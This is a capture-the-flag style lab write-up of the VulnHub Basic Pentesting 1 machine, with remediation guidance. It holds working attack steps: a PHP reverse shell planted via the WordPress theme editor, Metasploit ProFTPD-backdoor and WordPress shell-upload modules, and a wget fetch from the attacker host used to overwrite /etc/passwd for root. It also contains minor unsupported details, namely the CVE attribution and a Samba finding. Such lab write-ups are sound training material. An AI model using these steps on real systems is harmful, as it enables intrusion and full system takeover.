# VulnHub — Basic Pentesting 1

A penetration testing engagement targeting the **Basic Pentesting 1** virtual machine from VulnHub. The objective was to obtain root-level access on the target. Three independent attack paths were identified and exploited, demonstrating initial access, privilege escalation, and direct root compromise. No flag file was present on the machine; root shell access is the demonstrated end state.

---

## Table of Contents

1. [Machine Information](#machine-information)
2. [Methodology](#methodology)
3. [Host Discovery](#host-discovery)
4. [Port and Service Enumeration](#port-and-service-enumeration)
5. [Web Enumeration](#web-enumeration)
6. [WordPress Enumeration](#wordpress-enumeration)
7. [Attack Path 1 — WordPress to Root](#attack-path-1--wordpress-to-root)
8. [Attack Path 2 — ProFTPD 1.3.3c Direct Root Access](#attack-path-2--proftpd-133c-direct-root-access)
9. [Attack Path 3 — WordPress Metasploit Shell Upload](#attack-path-3--wordpress-metasploit-shell-upload)
10. [Attack Path Comparison](#attack-path-comparison)
11. [Vulnerabilities Identified](#vulnerabilities-identified)
12. [Remediation](#remediation)
13. [Tools Used](#tools-used)
14. [Key Takeaways](#key-takeaways)
15. [Conclusion](#conclusion)
16. [References](#references)

---

## Machine Information

| Property          | Value                                      |
|-------------------|--------------------------------------------|
| Platform          | VulnHub                                    |
| Machine           | Basic Pentesting 1                         |
| Network           | VirtualBox Host-Only (192.168.56.0/24)     |
| Target IP         | 192.168.56.105                             |
| Attacker IP       | 192.168.56.102 (Kali Linux)                |

---

## Methodology

1. **Host Discovery** — Identify the target on the local network.
2. **Port and Service Enumeration** — Scan for open ports and running service versions.
3. **Web Enumeration** — Directory brute-force and manual inspection of the web server.
4. **WordPress Enumeration** — Identify CMS version, themes, users, and credentials.
5. **Exploitation** — Execute three independent attack paths to gain access.
6. **Privilege Escalation / Root Verification** — Escalate privileges and confirm root-level access.
7. **Documentation & Remediation** — Compile findings and provide mitigation guidance.

---

## Host Discovery

The host-only network was scanned with `netdiscover` to identify the target:

```bash
sudo netdiscover -r 192.168.56.0/24
```

The target `192.168.56.105` was identified as an active VirtualBox guest (Oracle VirtualBox MAC vendor).

---

## Port and Service Enumeration

A full TCP service scan was performed with `nmap`:

```bash
sudo nmap -sV -Pn 192.168.56.105
```

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | open | ftp | ProFTPD 1.3.3c |
| 22/tcp | open | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 |
| 80/tcp | open | http | Apache httpd 2.4.18 (Ubuntu) |

**Service Info:** Host: BASIC-PENTESTING-1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

**Notable findings:**
- **ProFTPD 1.3.3c** — Version is associated with a known unauthenticated backdoor.
- **Apache 2.4.18** — Web service; directory enumeration was required.

---

## Web Enumeration

Directory enumeration was performed against the Apache web server:

```bash
gobuster dir -u http://192.168.56.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Finding:** `/secret/` directory discovered.

Browsing `http://192.168.56.105/secret/` returned an "Under Construction" placeholder page.  
Further inspection revealed a WordPress installation with the admin panel at:

```
http://192.168.56.105/secret/wp-admin/
```

---

## WordPress Enumeration

The WordPress instance was enumerated with `wpscan`:

```bash
wpscan --url http://192.168.56.105/secret/ --enumerate u
```

**Results:**
- Username enumerated: `admin`
- Theme detected: Twenty Seventeen

The WordPress admin login was tested with common credentials and validated:

| Username | Password | Result |
|----------|----------|--------|
| admin    | admin    | Login granted |

---

## Attack Path 1 — WordPress to Root

This path covers initial access via the WordPress admin panel and privilege escalation to root through a world-writable `/etc/passwd`.

### Initial Access (WordPress Admin → www-data)

1. Logged in to `/secret/wp-admin/` as `admin:admin`.
2. Navigated to **Appearance → Theme Editor → Twenty Seventeen → footer.php**.
3. Replaced the template contents with the pentestmonkey PHP reverse shell (`LHOST = 192.168.56.102`, `LPORT = 4444`).
4. Started a listener on the attacker:
   ```bash
   nc -lvnp 4444
   ```
5. Triggered the reverse shell by requesting the modified template:
   ```bash
   curl http://192.168.56.105/secret/wp-content/themes/twentyseventeen/footer.php
   ```
6. A reverse shell was received as `www-data`.

### Shell Stabilization

The shell was stabilized for interactive use:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Verification

```bash
whoami
www-data

hostname
basic-pentesting-1
```

### Enumeration

Reviewing `/etc/passwd` revealed the root account entry:

```
root:x:0:0:root:/root:/bin/bash
```

The file permissions were checked:

```bash
ls -la /etc/passwd
-rw-rw-rw- 1 root root ...
```

**Critical finding:** `/etc/passwd` is world-writable (mode 0666) — any local user can modify it.

### Privilege Escalation (www-data → root)

1. On the attacker, a new password hash was generated using `openssl`:
   ```bash
   openssl passwd -1 -salt salt password
   $1$salt$qJH7.N4xYta3aEG/dfqo/0
   ```

2. The full `/etc/passwd` content was copied and the root entry's `x` was replaced with the generated hash. The resulting file was saved as `passwords.txt`:
   ```
   root:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash
   ...
   ```

3. A temporary HTTP server was started on the attacker:
   ```bash
   python3 -m http.server 8000
   ```

4. The file was downloaded on the target:
   ```bash
   wget http://192.168.56.102:8000/passwords.txt
   ```

5. The modified passwd file was written over the original:
   ```bash
   cat passwords.txt > /etc/passwd
   ```

6. The root account was switched with the new password:
   ```bash
   su root -
   Password: password
   ```

### Root Verification

```bash
whoami
root

id
uid=0(root) gid=0(root) groups=0(root)

grep root /etc/passwd
root:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash

ls -la /root/
# No flag file present
```

Root-level access was successfully achieved. A flag file does not exist on this machine; the objective is a root shell.

---

## Attack Path 2 — ProFTPD 1.3.3c Direct Root Access

This path constitutes a direct root compromise — the vulnerable service executes commands as root without requiring any authentication or privilege escalation.

The ProFTPD version banner was identified during the `nmap` scan:

```
21/tcp   open  ftp   ProFTPD 1.3.3c
```

A search for exploits was performed:

```bash
searchsploit ProFTPD 1.3.3c
```

**Result:** ProFTPD 1.3.3c — Compromised Source Backdoor Remote Code Execution  
**Reference:** Exploit-DB 15662 (CVE-2010-4221)

This build of ProFTPD contains a backdoor in the source code. The backdoor triggers code execution when a specially crafted sequence is sent to the FTP service. No credentials are required.

The Metasploit module `exploit/unix/ftp/proftpd_133c_backdoor` was used:

```msf
msf6 > use exploit/unix/ftp/proftpd_133c_backdoor
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOST 192.168.56.105
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LHOST 192.168.56.102
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload cmd/unix/reverse
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > exploit
```

**Result:** A command shell was received with root privileges.

```bash
whoami
root

id
uid=0(root) gid=0(root) groups=0(root)
```

**Classification:** Direct root compromise. The backdoored ProFTPD binary runs with root privileges. The exploit returns a root shell; no privilege escalation step is required.

---

## Attack Path 3 — WordPress Metasploit Shell Upload

This path provides an alternative initial-access method using the same `admin:admin` credentials discovered during WordPress enumeration.

The Metasploit module `exploit/unix/webapp/wp_admin_shell_upload` was used:

```msf
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOST 192.168.56.105
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /secret
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set LHOST 192.168.56.102
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
```

**Result:** A shell was obtained as `www-data`.

```bash
whoami
www-data
```

**Important:** This exploit yields `www-data` access, not root. The same privilege-escalation technique documented in Attack Path 1 (Privilege Escalation) applies: `/etc/passwd` is world-writable, allowing a hash replacement attack to switch to root.

---

## Attack Path Comparison

| Path | Vector | Credentials | Initial Access | Final Result | Classification |
|------|--------|-------------|----------------|--------------|----------------|
| 1 | WordPress theme editor (manual PHP reverse shell) | admin:admin | www-data | root | Initial access + privilege escalation (writable /etc/passwd) |
| 2 | ProFTPD 1.3.3c backdoor RCE | None | root | root | Direct root compromise (no privilege escalation) |
| 3 | wp_admin_shell_upload (Metasploit) | admin:admin | www-data | root | Alternative initial access (same privesc as Path 1) |

---

## Vulnerabilities Identified

| # | Finding | Severity | Evidence | Impact | Remediation |
|---|---------|----------|----------|--------|-------------|
| 1 | ProFTPD 1.3.3c Backdoor RCE (CVE-2010-4221) | Critical | Unauthenticated root shell via Metasploit (`proftpd_133c_backdoor`); Exploit-DB 15662; version banner confirms 1.3.3c | Full system compromise; attacker obtains root shell with no credentials | Replace ProFTPD with a patched, source-verified build; upgrade to a supported version or remove the service if not required |
| 2 | World-Writable `/etc/passwd` | Critical | `ls -la /etc/passwd` shows mode 0666; root password hash successfully injected | Any local user (e.g., www-data) can replace root's password hash and escalate to root | Restore permissions: `chmod 0644 /etc/passwd`; ownership `root:root` |
| 3 | Weak WordPress Credentials | High | Successful login at `/secret/wp-admin/` with `admin:admin` | Full administrative access to the WordPress CMS; enables RCE via theme/plugin editor | Enforce strong unique passwords; implement two-factor authentication; rate-limit the login endpoint |
| 4 | RCE via WordPress Theme Editor | High | PHP reverse shell injected into `footer.php` (Twenty Seventeen theme) → command execution as www-data | Remote command execution on the web server; pivot point for privilege escalation | Disable the theme and plugin editor: `define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`; keep WordPress core, themes, and plugins updated |
| 5 | Outdated Software Stack | Medium | Version banners identified during nmap scan: Apache 2.4.18, OpenSSH 7.2p2, Samba 4.3.11 | Exposure to known vulnerabilities; increased attack surface | Upgrade all packages to current supported versions; disable unused services (SMB, FTP if not needed) |

---

## Remediation

| # | Finding | Remediation Action |
|---|---------|---------------------|
| 1 | ProFTPD 1.3.3c Backdoor | Upgrade or replace ProFTPD with a verified source build; use `apt` to pull a patched version; remove the FTP service if remote file transfer is not required |
| 2 | World-Writable `/etc/passwd` | `chmod 0644 /etc/passwd` and `chown root:root /etc/passwd`; audit other system files for similar misconfigurations |
| 3 | Weak WordPress Credentials | Enforce password complexity; enable 2FA; limit login attempts with a plugin (e.g., Limit Login Attempts Reloaded); remove unused admin accounts |
| 4 | RCE via Theme Editor | Add `define('DISALLOW_FILE_EDIT', true);` to `wp-config.php`; update all WordPress components; restrict admin access by IP |
| 5 | Outdated Software | Run `apt update && apt upgrade` to bring Apache, OpenSSH, Samba, and all system packages to the latest supported versions; apply kernel patches |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| netdiscover / arp-scan | Host discovery on the local network |
| nmap | Port scanning and service-version enumeration |
| gobuster | Web directory brute-force enumeration |
| curl / web browser | Web reconnaissance and reverse shell triggering |
| WPScan | WordPress user, theme, and vulnerability enumeration |
| netcat (nc) | Reverse shell listener |
| python3 http.server | Hosting passwords.txt for target download |
| wget | File transfer on the target machine |
| openssl | Generating MD5-crypt password hash for root |
| searchsploit | Locating exploit code for ProFTPD 1.3.3c |
| Metasploit Framework | `proftpd_133c_backdoor` and `wp_admin_shell_upload` |
| Python PTY (`import pty`) | Interactive shell stabilization |

---

## Key Takeaways

- Multiple attack paths existed to reach the same objective. Each path was fully independent and provided a different vector to root.
- Distinguishing initial access from privilege escalation is critical in penetration testing. Path 1 required both steps; Path 2 was a direct root compromise with no privesc.
- Version-specific service exploitation (the ProFTPD 1.3.3c backdoor) demonstrates why updating and verifying software sources is essential.
- Weak credentials remain a dominant root cause. The `admin:admin` combination unlocked the WordPress admin panel and enabled RCE.
- Misconfigured file permissions (world-writable `/etc/passwd`) allowed a trivial privilege escalation from `www-data` to `root`.
- Always attempt multiple approaches during an assessment. The `wp_admin_shell_upload` Metasploit module provided a faster initial access but required the same privesc. The ProFTPD backdoor gave direct root with zero configuration.

---

## Conclusion

The VulnHub Basic Pentesting 1 machine was fully compromised and root-level access was achieved through three independent attack paths. The WordPress admin interface was breached using weak credentials, leading to a PHP reverse shell. A world-writable `/etc/passwd` file allowed privilege escalation to root. The ProFTPD 1.3.3c service was discovered to contain an unauthenticated source backdoor, yielding an immediate root shell. A third Metasploit-based WordPress exploit provided an alternative initial-access route. All findings are documented with evidence and remediation recommendations. No flag file was present on the machine; root-level access served as the demonstrated final objective.

---

## References

- VulnHub — Basic Pentesting 1: https://www.vulnhub.com/entry/basic-pentesting-1,216/
- Exploit-DB — ProFTPD 1.3.3c Backdoor (15662): https://www.exploit-db.com/exploits/15662
- National Vulnerability Database — CVE-2010-4221: https://nvd.nist.gov/vuln/detail/CVE-2010-4221
- WPScan — WordPress Security Scanner: https://wpscan.com/
